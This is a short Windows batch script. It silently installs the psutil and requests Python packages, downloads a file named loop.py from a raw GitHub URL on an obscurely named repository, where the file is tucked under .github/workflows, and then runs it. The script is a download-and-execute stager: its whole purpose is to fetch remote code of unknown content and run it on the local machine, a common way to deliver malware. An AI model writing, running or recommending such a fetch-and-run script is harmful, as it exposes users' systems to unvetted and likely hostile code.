@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/Jajen49272jio1/didactic-fiesta/refs/heads/main/.github/workflows/loop.py
python loop.py
